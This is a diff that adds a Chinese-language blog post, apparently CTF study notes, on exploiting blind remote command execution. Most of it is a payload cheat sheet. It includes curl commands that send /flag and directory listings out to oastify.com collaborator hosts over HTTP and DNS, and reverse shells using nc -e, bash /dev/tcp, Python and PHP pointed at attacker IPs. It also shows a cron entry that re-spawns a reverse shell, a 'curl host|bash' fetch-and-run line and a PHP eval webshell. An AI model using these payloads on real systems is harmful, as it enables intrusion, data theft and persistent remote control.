@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="无回显RCE 判断无回显 浅谈PHP无回显命令执行的利用-先知社区 无回显RCE漏洞的常见五种突破技术  12windows：ping -n 5 127.0.0.1Linux：sleep 5   写入静态文件 带外 反弹shell 写马  写入静态文件 重定向符&gt; tee mv cp tar zip bzip2 xz jar 7z 等命令 压缩  123456ls&gt;1ls | tee">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无回显rce">
+<meta property="og:url" content="http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="无回显RCE 判断无回显 浅谈PHP无回显命令执行的利用-先知社区 无回显RCE漏洞的常见五种突破技术  12windows：ping -n 5 127.0.0.1Linux：sleep 5   写入静态文件 带外 反弹shell 写马  写入静态文件 重定向符&gt; tee mv cp tar zip bzip2 xz jar 7z 等命令 压缩  123456ls&gt;1ls | tee">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260127151242003.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260128120958397.png">
+<meta property="article:published_time" content="2026-01-28T10:34:02.000Z">
+<meta property="article:modified_time" content="2026-01-28T10:49:32.633Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="无回显RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260127151242003.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>无回显rce</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Hexo" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/lierbushiwo">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/&text=无回显rce"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/&title=无回显rce"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/&is_video=false&description=无回显rce"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=无回显rce&body=Check out this article: http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/&title=无回显rce"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/&title=无回显rce"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/&title=无回显rce"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/&title=无回显rce"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/&name=无回显rce&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/&t=无回显rce"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BERCE"><span class="toc-number">1.</span> <span class="toc-text">无回显RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">写入静态文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#tar"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">tar</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#zip-unzip"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">zip&#x2F;unzip</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96"><span class="toc-number">1.2.</span> <span class="toc-text">带外</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#http%E5%B8%A6%E5%A4%96"><span class="toc-number">1.2.1.</span> <span class="toc-text">http带外</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dns%E5%B8%A6%E5%A4%96"><span class="toc-number">1.2.2.</span> <span class="toc-text">dns带外</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.3.</span> <span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#netcat"><span class="toc-number">1.3.1.</span> <span class="toc-text">netcat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dev-tcp"><span class="toc-number">1.3.2.</span> <span class="toc-text">&#x2F;dev&#x2F;tcp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">定时任务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#etc-profile"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">&#x2F;etc&#x2F;profile</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Telnet%E5%8F%8D%E5%BC%B9"><span class="toc-number">1.3.3.</span> <span class="toc-text">Telnet反弹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9"><span class="toc-number">1.3.4.</span> <span class="toc-text">各种脚本反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#python"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">python</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">php</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E9%A9%AC"><span class="toc-number">1.4.</span> <span class="toc-text">写马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E5%86%99%E9%A9%AC"><span class="toc-number">1.4.1.</span> <span class="toc-text">sql写马</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.</span> <span class="toc-text">盲注</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        无回显rce
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-01-28T10:34:02.000Z" class="dt-published" itemprop="datePublished">2026-01-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/RCE/" rel="tag">RCE</a>, <a class="p-category" href="/tags/%E6%97%A0%E5%9B%9E%E6%98%BERCE/" rel="tag">无回显RCE</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="无回显RCE"><a href="#无回显RCE" class="headerlink" title="无回显RCE"></a>无回显RCE</h2><blockquote>
+<p>判断无回显</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7720">浅谈PHP无回显命令执行的利用-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/9lLnRfRKxPyM_FvLYzs60g">无回显RCE漏洞的常见五种突破技术</a></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows：ping -n 5 127.0.0.1</span><br><span class="line">Linux：<span class="built_in">sleep</span> 5</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>写入静态文件</li>
+<li>带外</li>
+<li>反弹shell</li>
+<li>写马</li>
+</ul>
+<h3 id="写入静态文件"><a href="#写入静态文件" class="headerlink" title="写入静态文件"></a>写入静态文件</h3><ul>
+<li>重定向符<code>&gt;</code></li>
+<li><code>tee</code></li>
+<li><code>mv cp</code></li>
+<li><code>tar zip bzip2 xz jar 7z</code> 等命令 压缩</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span>&gt;1</span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> | <span class="built_in">tee</span> 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> flag.php flag.txt</span><br><span class="line"><span class="built_in">mv</span> flag.php flag.txt</span><br></pre></td></tr></table></figure>
+
+<h5 id="tar"><a href="#tar" class="headerlink" title="tar"></a><code>tar</code></h5><blockquote>
+<p><a target="_blank" rel="noopener" href="https://wangchujiang.com/linux-command/c/tar.html">tar</a></p>
+<p>首先要弄清两个概念：打包和压缩。打包是指将一大堆文件或目录变成一个总的文件；压缩则是将一个大的文件通过一些压缩算法变成一个小文件。</p>
+<p>为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -cf a 1.txt 2.txt <span class="comment"># a是tar格式归档文件</span></span><br><span class="line">tar -tf a</span><br><span class="line">tar -xf a</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>-f: 使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名。</p>
+</blockquote>
+<p>一次性打包并压缩、解压并解包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -zcf b.tar.gz 1.txt 2.txt</span><br><span class="line">tar -ztf b.tar.gz</span><br><span class="line">tar -zxf b.tar.gz#直接提取到当前文件夹</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- z：有gzip属性的</span><br><span class="line">- j：有bz2属性的</span><br><span class="line">- Z：有compress属性的</span><br></pre></td></tr></table></figure></blockquote>
+<p>tar解压缩到指定文件夹</p>
+<blockquote>
+<p><code>-C 目录</code>：要求目录必须存在</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260127151242003.png" alt="image-20260127151241828"></p>
+<h5 id="zip-unzip"><a href="#zip-unzip" class="headerlink" title="zip/unzip"></a><code>zip/unzip</code></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zip a.zip 1.txt 2.txt</span><br><span class="line">zip -r a.zip </span><br><span class="line">unzip a.zip# 默认是当前路径</span><br><span class="line">unzip a.zip -d l/#-d 指定解压目录 目录不存在则创建</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="带外"><a href="#带外" class="headerlink" title="带外"></a>带外</h3><blockquote>
+<p>Burp-Collaborator 服务器</p>
+<p><a target="_blank" rel="noopener" href="http://ceye.io/profile">CEYE - Monitor service for security testing</a></p>
+<p><a target="_blank" rel="noopener" href="http://dnslog.cn/">DNSLog Platform</a></p>
+<p>公网服务器</p>
+<ul>
+<li><p><code>nc</code>监听</p>
+</li>
+<li><p><code>web</code>服务</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$f</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</blockquote>
+<h4 id="http带外"><a href="#http带外" class="headerlink" title="http带外"></a><code>http</code>带外</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#http外带</span></span><br><span class="line">curl -X POST -F xx=@/flag  u2xmtafs0ayqirmak7poce0wcnid62.oastify.com</span><br><span class="line">curl u2xmtafs0ayqirmak7poce0wcnid62.oastify.com?a=`<span class="built_in">ls</span> | <span class="built_in">base64</span>`</span><br><span class="line">curl jyly58qieer4raf1f97zku1k4ba1yq.oastify.com/`<span class="built_in">ls</span> | <span class="built_in">base64</span>`</span><br><span class="line">curl jyly58qieer4raf1f97zku1k4ba1yq.oastify.com/`<span class="built_in">ls</span> | sed -n 2p`</span><br><span class="line"></span><br><span class="line">wget</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在 <strong>curl</strong> 命令中，<em>@</em> 符号常用于表示<strong>从文件中读取数据</strong>或<strong>上传文件</strong>，而不是直接在命令中写入数据。这在处理大数据、二进制文件或避免命令行转义复杂字符时非常有用。</p>
+<p>命令打出的回显需要经过<code>base64</code>等的处理</p>
+</blockquote>
+<h4 id="dns带外"><a href="#dns带外" class="headerlink" title="dns带外"></a><code>dns</code>带外</h4><blockquote>
+<p> Shell 会忽略命令末尾多余空格</p>
+<p> 域名 <a target="_blank" rel="noopener" href="https://kingx.me/dns-protocol.html">DNS协议 – KINGX</a></p>
+<ul>
+<li><p>不区分大小写 <a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc1035#section-3.1">RFC 1035 - Domain names - implementation and specification</a></p>
+</li>
+<li><p>允许的字符范围为：字母、-、数字。Tips: 有些例外，比如DNS发现服务的PTR中会包含下划线，如: <code>_udp.C</code></p>
+</li>
+<li><p>长度限制 <a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc1035#section-2.3.4">RFC 1035 - Domain names - implementation and specification</a></p>
+</li>
+</ul>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">curl `xxd -p /flag | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span>`.rsnzw4osqz3ph4yvu4sr6ol6dxjq7f.oastify.com</span><br><span class="line">curl <span class="string">&quot;<span class="subst">$(xxd -p /f* | tr -d &#x27;\n&#x27;)</span>&quot;</span>.rsnzw4osqz3ph4yvu4sr6ol6dxjq7f.oastify.com</span><br><span class="line">curl <span class="string">&quot;<span class="subst">$(xxd -p flag.php | tr -d &#x27;\n&#x27; | fold -w 60 | paste -sd &#x27;.&#x27; -)</span>&quot;</span>.rsnzw4osqz3ph4yvu4sr6ol6dxjq7f.oastify.com</span><br><span class="line"></span><br><span class="line">curl <span class="string">&quot;<span class="subst">$(xxd -p flag.php | sed &#x27;:a;N;$!ba;s/\n//g&#x27; | fold -w 60 | paste -sd &#x27;.&#x27; -)</span>&quot;</span>.rsnzw4osqz3ph4yvu4sr6ol6dxjq7f.oastify.com</span><br><span class="line"></span><br><span class="line">wget</span><br><span class="line"></span><br><span class="line">ping</span><br><span class="line">nslookup</span><br><span class="line">dig</span><br><span class="line">host</span><br><span class="line">getent hosts example.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里可以用base32尝试一下 (原始字符长度是5的倍数编码后无<code>=</code>即可达到目的)</p>
+<p>补充：base64(原始字符长度是3的倍数编码后无<code>=</code>)</p>
+<p>base-docx <a target="_blank" rel="noopener" href="https://www.rfc-editor.org/rfc/rfc4648">RFC 4648: The Base16, Base32, and Base64 Data Encodings</a></p>
+</blockquote>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/8987">反弹Shell，看这一篇就够了-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/shell/">反弹shell命令在线生成器|🔰雨苁🔰</a></p>
+<p>前置知识：<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/">Linux反弹shell（一）文件描述符与重定向 - K0rz3n’s Blog</a>     </p>
+</blockquote>
+<h4 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a><code>netcat</code></h4><blockquote>
+<p><code>nc</code>、<code>Ncat</code>都是一个</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#靶机出去找 正向</span></span><br><span class="line">nc 192.168.243.129 8888 -e /bin/bash</span><br><span class="line"><span class="comment">#反向</span></span><br><span class="line">nc  -lvp 8888 -e /bin/bash <span class="comment">#把shell绑定在自己的8888端口</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="dev-tcp"><a href="#dev-tcp" class="headerlink" title="/dev/tcp"></a><code>/dev/tcp</code></h4><blockquote>
+<p><strong>&#x2F;dev&#x2F;tcp</strong> 并不是一个真实存在的 “设备文件”（不同于 &#x2F;dev&#x2F;null 、 &#x2F;dev&#x2F;sda 等实际设备），而是 Bas<strong>h</strong> <strong>Shell</strong> 提供的一种特殊 “伪设备”（pseudo-device）</p>
+<p>sh也能用的原因[<strong>Red Hat 系</strong>]</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260128120958397.png" alt="image-20260128120958247"></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.243.129/8888 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.243.129/8888 0&lt;&amp;1</span><br><span class="line">bash -c <span class="string">&quot;bash -i &amp;&gt; /dev/tcp/192.168.243.129/8888 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br><span class="line">sh -i &gt;&amp; /dev/tcp/192.168.243.129/8888 0&gt;&amp;1</span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.243.129/8888;<span class="built_in">cat</span> &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>payload</code>详解看[Linux 反弹shell（二）反弹shell的本质 - K0rz3n’s Blog](<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/08/05/Linux">https://www.k0rz3n.com/2018/08/05/Linux</a> 反弹shell （二）反弹shell的本质&#x2F;)</li>
+<li>搭配<code>curl</code>使用<code>curl 47.xxx.xxx.72|bash</code></li>
+</ul>
+<h5 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h5><blockquote>
+<p>比如，当前用户名为root，我们就要将下面内容写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root 中。(centos系列主机)</p>
+<p>比如，当前用户名为root，我们就要将下面内容写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root 中。(Debian&#x2F;Ubuntu系列主机)</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">		-e</span><br><span class="line">		-u lier</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1  *  *  *  *   /bin/bash -i &gt;&amp; /dev/tcp/192.168.243.129/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>要用绝对路径</p>
+</blockquote>
+<h5 id="etc-profile"><a href="#etc-profile" class="headerlink" title="/etc/profile"></a><code>/etc/profile</code></h5><blockquote>
+<p>全局配置文件，设置所有用户的登录 shell 环境变量</p>
+<p>每次启动交互式登录 shell 时都会被执行</p>
+</blockquote>
+<h4 id="Telnet反弹"><a href="#Telnet反弹" class="headerlink" title="Telnet反弹"></a>Telnet反弹</h4><h4 id="各种脚本反弹"><a href="#各种脚本反弹" class="headerlink" title="各种脚本反弹"></a>各种脚本反弹</h4><h5 id="python"><a href="#python" class="headerlink" title="python"></a>python</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.xxx.xxx.72&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line"></span><br><span class="line">python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="php"><a href="#php" class="headerlink" title="php"></a>php</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;47.xxx.xxx.72&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="写马"><a href="#写马" class="headerlink" title="写马"></a>写马</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247497580&idx=1&sn=c77028340ad979d0182045d5796a3826&subscene=0&poc_token=HMq0eWmjsx7UrqmTT9R6WnQ1f0pWCVsQpZe_oZYH">命令执行不出网、无回显、连基础工具base64&#x2F;xxd都没有？极限生存下的命令执行，怎么打？</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php eval(<span class="variable">$_POST</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span> &gt; shell.php</span><br></pre></td></tr></table></figure>
+
